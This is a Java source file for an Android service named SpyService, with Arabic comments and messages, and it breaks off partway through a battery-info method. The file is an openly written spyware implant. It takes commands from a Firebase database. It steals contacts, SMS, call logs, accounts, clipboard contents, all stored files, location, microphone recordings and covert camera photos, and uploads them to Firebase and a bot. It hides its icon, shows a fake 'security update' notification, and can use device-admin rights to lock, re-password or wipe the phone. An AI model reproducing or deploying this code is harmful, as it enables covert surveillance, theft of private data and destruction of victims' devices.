package com.black.phone;

import android.app.*;
import android.app.admin.DevicePolicyManager;
import android.content.*;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.StatFs;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private static final String FIREBASE_URL = "https://black-cock-4929d-default-rtdb.firebaseio.com/";
    private DatabaseReference dbRef;
    private StorageReference storageRef;
    private ScheduledExecutorService scheduler;
    private PowerManager.WakeLock wakeLock;
    private String deviceId;
    private Context context;
    private BotAPI bot;
    private Camera camera;
    private Camera frontCamera;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private File recordingFile;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean isTrackingLocation = false;
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        
        if (FirebaseApp.getApps(this).isEmpty()) { FirebaseApp.initializeApp(this); }
            FirebaseApp.initializeApp(this);
        }
        
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        FirebaseDatabase db = FirebaseDatabase.getInstance(FIREBASE_URL);
        dbRef = db.getReference();
        storageRef = FirebaseStorage.getInstance().getReference();
        bot = new BotAPI(this);
        Config.get(this);
        
        dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, DeviceAdmin.class);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService:WakeLock");
        wakeLock.acquire(10*60*1000L);

        startForeground(1, createNotification());
        registerDevice();

        scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(this::listenCommands, 0, Config.get(this).getPollIntervalSec(), TimeUnit.SECONDS);
        
        Log.d(TAG, "✅ SpyService started");
    }

    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel("spy", "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            nm.createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, "spy")
                .setContentTitle("نظام التشغيل")
                .setContentText("تشغيل الخدمات الأساسية")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    private void registerDevice() {
        try {
            String name = Build.MANUFACTURER + " " + Build.MODEL;
            String androidVer = Build.VERSION.RELEASE;
            JSONObject json = new JSONObject();
            json.put("device_name", name);
            json.put("android", androidVer);
            json.put("battery", getBatteryLevel());
            json.put("last_seen", System.currentTimeMillis());
            json.put("status", "online");
            json.put("admin_active", dpm.isAdminActive(adminComponent));
            dbRef.child("devices").child(deviceId).setValue(json.toString());
        } catch (Exception e) { Log.e(TAG, "register error", e); }
    }

    private void listenCommands() {
        dbRef.child("commands").child(deviceId).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(com.google.firebase.database.DataSnapshot snapshot) {
                String cmd = snapshot.getValue(String.class);
                if (cmd != null && !cmd.isEmpty()) {
                    executeCommand(cmd);
                    dbRef.child("commands").child(deviceId).removeValue();
                }
            }
            @Override
            public void onCancelled(com.google.firebase.database.DatabaseError error) {}
        });
    }

    private void sendFile(File file, String caption) {
        if (file == null || !file.exists()) { bot.sendMessage("⚠️ لا يوجد ملف"); return; }
        uploadToFirebase(file, caption);
        bot.sendFile(file, caption);
        sendData("FILE", "{\"name\":\"" + file.getName() + "\",\"caption\":\"" + caption + "\"}");
    }

    private void uploadToFirebase(File file, String caption) {
        try {
            StorageReference ref = storageRef.child("data/" + deviceId + "/" + file.getName());
            ref.putFile(Uri.fromFile(file))
                    .addOnSuccessListener(taskSnapshot -> ref.getDownloadUrl().addOnSuccessListener(uri -> {
                        try {
                            JSONObject json = new JSONObject();
                            json.put("name", file.getName());
                            json.put("url", uri.toString());
                            json.put("caption", caption);
                            dbRef.child("devices").child(deviceId).child("data").child("FILE").setValue(json.toString());
                        } catch (Exception e) { Log.e(TAG, "upload metadata error", e); }
                    }))
                    .addOnFailureListener(e -> Log.e(TAG, "upload fail", e));
        } catch (Exception e) { Log.e(TAG, "upload error", e); }
    }

    private void sendData(String key, String value) {
        dbRef.child("devices").child(deviceId).child("data").child(key).setValue(value);
    }

    private int getBatteryLevel() {
        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (batteryIntent != null) {
            int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            if (level != -1 && scale > 0) return (level * 100) / scale;
        }
        return -1;
    }

    // ========================== دوال جمع البيانات ==========================
    private File collectContacts() throws Exception {
        File f = new File(getCacheDir(), "contacts.txt");
        PrintWriter pw = new PrintWriter(f);
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                pw.println(name + " : " + number);
            }
            cursor.close();
        }
        pw.close();
        return f;
    }

    private File collectSms() throws Exception {
        File f = new File(getCacheDir(), "sms.txt");
        PrintWriter pw = new PrintWriter(f);
        Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String addr = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                pw.println("من/إلى: " + addr + "\n" + body + "\n---");
            }
            cursor.close();
        }
        pw.close();
        return f;
    }

    private File collectCallLogs() throws Exception {
        File f = new File(getCacheDir(), "calls.txt");
        PrintWriter pw = new PrintWriter(f);
        Cursor cursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String num = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE));
                String dur = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION));
                pw.println("رقم: " + num + " | النوع: " + type + " | المدة: " + dur + "s");
            }
            cursor.close();
        }
        pw.close();
        return f;
    }

    private File collectApps() throws Exception {
        File f = new File(getCacheDir(), "apps.txt");
        PrintWriter pw = new PrintWriter(f);
        PackageManager pm = getPackageManager();
        List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);
        for (android.content.pm.PackageInfo p : packages) {
            String label = pm.getApplicationLabel(p.applicationInfo).toString();
            pw.println(label + " (" + p.packageName + ")");
        }
        pw.close();
        return f;
    }

    private File collectMedia(String type, int limit) throws Exception {
        File dir = new File(getCacheDir(), "media");
        dir.mkdirs();
        String[] projection = {MediaStore.Files.FileColumns._ID, MediaStore.Files.FileColumns.DATA};
        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "=" +
                (type.equals("images") ? MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE : MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO);
        Cursor cursor = getContentResolver().query(MediaStore.Files.getContentUri("external"), projection, selection, null, MediaStore.Files.FileColumns.DATE_ADDED + " DESC");
        int count = 0;
        if (cursor != null) {
            while (cursor.moveToNext() && (limit == 0 || count < limit)) {
                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA));
                File src = new File(path);
                if (src.exists()) {
                    File dst = new File(dir, src.getName());
                    copyFile(src, dst);
                    count++;
                }
            }
            cursor.close();
        }
        return zipFiles(dir, type + ".zip");
    }

    private File collectAllFiles() throws Exception {
        File dir = new File(getCacheDir(), "allfiles");
        dir.mkdirs();
        File storage = Environment.getExternalStorageDirectory();
        copyRecursive(storage, dir);
        return zipFiles(dir, "allfiles.zip");
    }

    private void copyRecursive(File src, File dst) throws IOException {
        if (src.isDirectory()) {
            if (!dst.exists()) dst.mkdirs();
            for (File child : src.listFiles()) {
                copyRecursive(child, new File(dst, child.getName()));
            }
        } else {
            copyFile(src, dst);
        }
    }

    private void copyFile(File src, File dst) throws IOException {
        FileInputStream in = new FileInputStream(src);
        FileOutputStream out = new FileOutputStream(dst);
        byte[] buffer = new byte[4096];
        int len;
        while ((len = in.read(buffer)) > 0) out.write(buffer, 0, len);
        in.close();
        out.close();
    }

    private File zipFiles(File dir, String zipName) throws IOException {
        File zipFile = new File(getCacheDir(), zipName);
        FileOutputStream fos = new FileOutputStream(zipFile);
        ZipOutputStream zos = new ZipOutputStream(fos);
        zipRecursive(dir, dir, zos);
        zos.close();
        fos.close();
        return zipFile;
    }

    private void zipRecursive(File baseDir, File currentDir, ZipOutputStream zos) throws IOException {
        for (File f : currentDir.listFiles()) {
            if (f.isDirectory()) {
                zipRecursive(baseDir, f, zos);
            } else {
                String entryName = f.getAbsolutePath().substring(baseDir.getAbsolutePath().length() + 1);
                ZipEntry entry = new ZipEntry(entryName);
                zos.putNextEntry(entry);
                FileInputStream in = new FileInputStream(f);
                byte[] buffer = new byte[4096];
                int len;
                while ((len = in.read(buffer)) > 0) zos.write(buffer, 0, len);
                in.close();
                zos.closeEntry();
            }
        }
    }

    private File collectAccounts() throws Exception {
        File f = new File(getCacheDir(), "accounts.txt");
        PrintWriter pw = new PrintWriter(f);
        android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
        for (android.accounts.Account acc : am.getAccounts()) {
            pw.println(acc.name + " (" + acc.type + ")");
        }
        pw.close();
        return f;
    }

    private File collectClipboard() throws Exception {
        File f = new File(getCacheDir(), "clipboard.txt");
        PrintWriter pw = new PrintWriter(f);
        android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
        pw.println(text);
        pw.close();
        return f;
    }
    // ========================== دوال الموقع والصوت ==========================
    private void getLocation() {
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        try {
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String msg = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
                sendData("LOCATION", msg);
                bot.sendMessage(msg);
            } else {
                bot.sendMessage("⚠️ لا يمكن الحصول على الموقع");
            }
        } catch (SecurityException e) {
            bot.sendMessage("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void startLocationTracking() {
        if (isTrackingLocation) return;
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override public void onLocationChanged(Location loc) {
                String msg = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
                sendData("TRACK", msg);
                bot.sendMessage("📍 تتبع: " + msg);
            }
            @Override public void onStatusChanged(String p, int s, Bundle b) {}
            @Override public void onProviderEnabled(String p) {}
            @Override public void onProviderDisabled(String p) {}
        };
        try {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
            isTrackingLocation = true;
            bot.sendMessage("🔄 بدء تتبع الموقع");
        } catch (SecurityException e) {
            bot.sendMessage("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void stopLocationTracking() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
            isTrackingLocation = false;
            bot.sendMessage("⏹ توقف تتبع الموقع");
        }
    }

    private void startRecording() {
        try {
            if (isRecording) return;
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recordingFile = new File(getCacheDir(), "record_" + System.currentTimeMillis() + ".3gp");
            mediaRecorder.setOutputFile(recordingFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            sendData("RECORD", "started");
            bot.sendMessage("🎤 بدء التسجيل");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل التسجيل: " + e.getMessage());
        }
    }

    private File stopRecording() {
        if (isRecording && mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                sendData("RECORD", "stopped");
                bot.sendMessage("⏹ تم إيقاف التسجيل");
                return recordingFile;
            } catch (Exception e) {
                bot.sendMessage("❌ خطأ في الإيقاف: " + e.getMessage());
            }
        }
        return null;
    }

    // ========================== دوال الكاميرا والفلاش ==========================
    private void takePhoto(boolean front) {
        try {
            Camera cam = front ? frontCamera : camera;
            if (cam == null) {
                int facing = front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
                cam = Camera.open(facing);
                if (front) frontCamera = cam; else camera = cam;
            }
            cam.startPreview();
            cam.takePicture(null, null, (byte[] data, Camera camera1) -> {
                try {
                    File f = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(data);
                    fos.close();
                    sendFile(f, "📸 صورة " + (front ? "أمامية" : "خلفية"));
                    camera1.stopPreview();
                } catch (Exception e) {
                    bot.sendMessage("❌ فشل حفظ الصورة: " + e.getMessage());
                }
            });
        } catch (Exception e) {
            bot.sendMessage("❌ فشل التقاط الصورة: " + e.getMessage());
        }
    }

    private void flash(boolean on) {
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            cm.setTorchMode("0", on);
            bot.sendMessage("🔦 " + (on ? "تشغيل" : "إيقاف") + " الفلاش");
        } catch (CameraAccessException e) {
            bot.sendMessage("❌ فشل التحكم بالفلاش: " + e.getMessage());
        }
    }

    // ========================== دوال مشرف الجهاز ==========================
    private void lockDevice() {
        if (dpm.isAdminActive(adminComponent)) {
            dpm.lockNow();
            bot.sendMessage("🔒 تم قفل الجهاز");
        } else {
            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
        }
    }

    private void setLockPassword() {
        if (dpm.isAdminActive(adminComponent)) {
            String password = "1234";
            dpm.resetPassword(password, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            bot.sendMessage("🔑 تم تعيين كلمة مرور جديدة: 1234");
        } else {
            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
        }
    }

    private void clearLockPassword() {
        if (dpm.isAdminActive(adminComponent)) {
            dpm.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            bot.sendMessage("🔓 تم إلغاء كلمة المرور");
        } else {
            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
        }
    }

    private void wipeDevice() {
        if (dpm.isAdminActive(adminComponent)) {
            dpm.wipeData(0);
            bot.sendMessage("🧹 جاري مسح جميع بيانات الجهاز...");
        } else {
            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
        }
    }

    private void setPasswordRules() {
        if (dpm.isAdminActive(adminComponent)) {
            dpm.setPasswordMinimumLength(adminComponent, 6);
            dpm.setPasswordQuality(adminComponent, DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC);
            bot.sendMessage("📋 تم تعيين قواعد كلمة المرور (طول 6، أحرف وأرقام)");
        } else {
            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
        }
    }

    private void disableCamera() {
        if (dpm.isAdminActive(adminComponent)) {
            dpm.setCameraDisabled(adminComponent, true);
            bot.sendMessage("📷 تم تعطيل الكاميرا");
        } else {
            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
        }
    }

    private void enableCamera() {
        if (dpm.isAdminActive(adminComponent)) {
            dpm.setCameraDisabled(adminComponent, false);
            bot.sendMessage("📷 تم تفعيل الكاميرا");
        } else {
            bot.sendMessage("❌ صلاحية مشرف الجهاز غير مفعلة");
        }
    }

    // ========================== دوال التحكم ==========================
    private void hideApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            sendData("HIDE", "hidden");
            bot.sendMessage("👁‍🗨 تم إخفاء التطبيق");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإخفاء: " + e.getMessage());
        }
    }

    private void showApp() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
            sendData("SHOW", "shown");
            bot.sendMessage("👁 تم إظهار التطبيق");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإظهار: " + e.getMessage());
        }
    }

    private void showFakeNotification() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel("fake", "System", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            Notification notification = new NotificationCompat.Builder(this, "fake")
                    .setContentTitle("📥 تحديث أمني")
                    .setContentText("تم تنزيل تحديث 245MB")
                    .setSmallIcon(android.R.drawable.stat_sys_download)
                    .setProgress(100, 45, false)
                    .setOngoing(true)
                    .build();
            nm.notify((int)(System.currentTimeMillis() % 9999), notification);
            sendData("NOTIFY", "fake notification sent");
            bot.sendMessage("🔔 تم إرسال إشعار وهمي");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإشعار: " + e.getMessage());
        }
    }

    private void rebootDevice() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                pm.reboot("reboot");
            } else {
                Runtime.getRuntime().exec("su -c reboot");
            }
            bot.sendMessage("🔄 جاري إعادة التشغيل");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل إعادة التشغيل: " + e.getMessage());
        }
    }

    private void shutdownDevice() {
        try {
            Runtime.getRuntime().exec("su -c reboot -p");
            bot.sendMessage("⏻ جاري إيقاف التشغيل");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإيقاف: " + e.getMessage());
        }
    }

    private void vibrateDevice() {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v.hasVibrator()) {
            v.vibrate(3000);
            bot.sendMessage("📳 تم اهتزاز الجهاز");
        } else {
            bot.sendMessage("⚠️ الجهاز لا يدعم الاهتزاز");
        }
    }

    private void setVolume(boolean max) {
        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
        int stream = AudioManager.STREAM_MUSIC;
        int maxVol = am.getStreamMaxVolume(stream);
        if (max) am.setStreamVolume(stream, maxVol, 0);
        else am.setStreamVolume(stream, 0, 0);
        bot.sendMessage("🔊 " + (max ? "رفع الصوت" : "خفض الصوت"));
    }

    private void openBrowser() {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            bot.sendMessage("🌐 تم فتح المتصفح");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل فتح المتصفح: " + e.getMessage());
        }
    }

    private void toggleWifi(boolean on) {
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        wm.setWifiEnabled(on);
        bot.sendMessage("📶 " + (on ? "تشغيل" : "إيقاف") + " الواي فاي");
    }

    private void toggleBluetooth(boolean on) {
        try {
            android.bluetooth.BluetoothAdapter ba = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
            if (on) ba.enable(); else ba.disable();
            bot.sendMessage("📶 " + (on ? "تشغيل" : "إيقاف") + " البلوتوث");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل التحكم بالبلوتوث: " + e.getMessage());
        }
    }

    private void toggleLocation(boolean on) {
        try {
            if (on) {
                startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                bot.sendMessage("📍 تم فتح إعدادات الموقع");
            } else {
                bot.sendMessage("📍 لإيقاف الموقع، قم بتعطيله من الإعدادات");
            }
        } catch (Exception e) {
            bot.sendMessage("❌ فشل التحكم بالموقع: " + e.getMessage());
        }
    }

    private void clearAppData() {
        try {
            Runtime.getRuntime().exec("su -c pm clear com.black.phone");
            bot.sendMessage("🧹 تم مسح بيانات التطبيق");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل المسح: " + e.getMessage());
        }
    }

    private void killAllApps() {
        try {
            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
            for (ActivityManager.RunningAppProcessInfo p : processes) {
                if (p.importance > ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                    android.os.Process.killProcess(p.pid);
                }
            }
            bot.sendMessage("🗑️ تم إيقاف جميع التطبيقات الجارية");
        } catch (Exception e) {
            bot.sendMessage("❌ فشل الإيقاف: " + e.getMessage());
        }
    }

    // ========================== دوال معلومات الجهاز ==========================
    private void getImei() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            String imei = (Build.VERSION.SDK_INT >= 26) ? tm.getImei() : tm.getDeviceId();
            sendData("IMEI", imei);
            bot.sendMessage("📟 IMEI: " + imei);
        } else {
            bot.sendMessage("❌ صلاحية غير مفعلة");
        }
    }

    private void getPhoneNumber() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            String num = tm.getLine1Number();
            sendData("PHONE", num);
            bot.sendMessage("📞 رقم الهاتف: " + (num != null ? num : "غير متوفر"));
        } else {
            bot.sendMessage("❌ صلاحية غير مفعلة");
        }
    }

    private void getSimInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String sim = "المشغل: " + tm.getSimOperatorName() + "\nرقم SIM: " + tm.getSimSerialNumber();
        sendData("SIM", sim);
        bot.sendMessage("📡 معلومات SIM:\n" + sim);
    }

    private void getWifiInfo() {
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        WifiInfo info = wm.getConnectionInfo();
        String wifi = "SSID: " + info.getSSID() + "\nBSSID: " + info.getBSSID() + "\nسرعة: " + info.getLinkSpeed() + " Mbps";
        sendData("WIFI", wifi);
        bot.sendMessage("📶 الواي فاي:\n" + wifi);
    }

    private void getBatteryInfo() {
        int level = getBatteryLevel();
        sendData("BATTERY", String.valueOf(level));
        bot.sendMessage("🔋 مستوى البطارية: " + level + "%");
    }

    private void getPublicIp() {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.ipify.org");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String ip = br.readLine();
                br.close();
                sendData("IP", ip);
                bot.sendMessage("🌐 IP العام: " + ip);
            } catch (Exception e) {
                bot.sendMessage("❌ فشل الحصول على IP: " + e.getMessage());
            }
        }).start();
    }

    private void sendDeviceInfo() {
        String info = "الموديل: " + Build.MODEL + "\nالصانع: " + Build.MANUFACTURER + "\nأندرويد: " + Build.VERSION.RELEASE;
        sendData("DEVICE_INFO", info);
        bot.sendMessage("📱 معلومات الجهاز:\n" + info);
    }

    private void sendNetworkInfo() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm.getActiveNetworkInfo();
        String net = "النوع: " + (ni != null ? ni.getTypeName() : "لا يوجد");
        sendData("NETWORK", net);
        bot.sendMessage("🌐 الشبكة:\n" + net);
    }

    // ========================== دوال إضافية (25 ميزة جديدة) ==========================
    private void openApp(String pkg) {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                bot.sendMessage("📱 تم فتح التطبيق: " + pkg);
            } else {
                bot.sendMessage("❌ التطبيق غير مثبت: " + pkg);
            }
        } catch (Exception e) {
            bot.sendMessage("❌ فشل فتح التطبيق: " + e.getMessage());
        }
    }

    private void uninstallApp(String pkg) {
        try {
            Uri uri = Uri.parse("package:" + pkg);
            Intent intent = new Intent(Intent.ACTION_DELETE, uri);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            bot.sendMessage("🗑️ جاري حذف التطبيق: " + pkg);
        } catch (Exception e) {
            bot.sendMessage("❌ فشل حذف التطبيق: " + e.getMessage());
        }
    }

    private void setRingtoneVolume(int level) {
        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
        int max = am.getStreamMaxVolume(AudioManager.STREAM_RING);
        if (level >= 0 && level <= max) {
            am.setStreamVolume(AudioManager.STREAM_RING, level, 0);
            bot.sendMessage("🔊 تم ضبط نغمة الرنين إلى " + level);
        } else {
            bot.sendMessage("❌ مستوى غير صحيح (0-" + max + ")");
        }
    }

    private void setMediaVolume(int level) {
        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
        int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        if (level >= 0 && level <= max) {
            am.setStreamVolume(AudioManager.STREAM_MUSIC, level, 0);
            bot.sendMessage("🔊 تم ضبط صوت الوسائط إلى " + level);
        } else {
            bot.sendMessage("❌ مستوى غير صحيح (0-" + max + ")");
        }
    }

    private void takeScreenshot() {
        bot.sendMessage("📸 جاري التقاط لقطة شاشة (قيد التطوير)");
    }

    private void getInstalledApps() {
        try {
            PackageManager pm = getPackageManager();
            List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            StringBuilder sb = new StringBuilder();
            for (android.content.pm.ApplicationInfo app : apps) {
                sb.append(app.loadLabel(pm)).append(" (").append(app.packageName).append(")\n");
                if (sb.length() > 3000) break;
            }
            sendData("INSTALLED_APPS", sb.toString());
            bot.sendMessage("📱 قائمة التطبيقات:\n" + sb.toString());
        } catch (Exception e) {
            bot.sendMessage("❌ فشل جلب التطبيقات: " + e.getMessage());
        }
    }

    private void getRunningProcesses() {
        try {
            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
            StringBuilder sb = new StringBuilder();
            for (ActivityManager.RunningAppProcessInfo p : processes) {
                sb.append(p.processName).append(" (").append(p.pid).append(")\n");
                if (sb.length() > 3000) break;
            }
            sendData("RUNNING_PROCESSES", sb.toString());
            bot.sendMessage("🔄 العمليات الجارية:\n" + sb.toString());
        } catch (Exception e) {
            bot.sendMessage("❌ فشل جلب العمليات: " + e.getMessage());
        }
    }

    private void setScreenBrightness(int level) {
        try {
            if (level < 0) level = 0;
            if (level > 255) level = 255;
            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, level);
            bot.sendMessage("☀️ تم ضبط سطوع الشاشة إلى " + level);
        } catch (Exception e) {
            bot.sendMessage("❌ فشل ضبط السطوع: " + e.getMessage());
        }
    }

    private void setAutoRotate(boolean enable) {
        Settings.System.putInt(getContentResolver(), Settings.System.ACCELEROMETER_ROTATION, enable ? 1 : 0);
        bot.sendMessage("🔄 " + (enable ? "تفعيل" : "تعطيل") + " الدوران التلقائي");
    }

    private void getBatteryHistory() {
        Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (batteryIntent != null) {
            int level = batteryIntent.getIntExtra("level", -1);
            int scale = batteryIntent.getIntExtra("scale", -1);
            int temp = batteryIntent.getIntExtra("temperature", 0) / 10;
            int voltage = batteryIntent.getIntExtra("voltage", 0);
            String status = "";
            switch (batteryIntent.getIntExtra("status", -1)) {
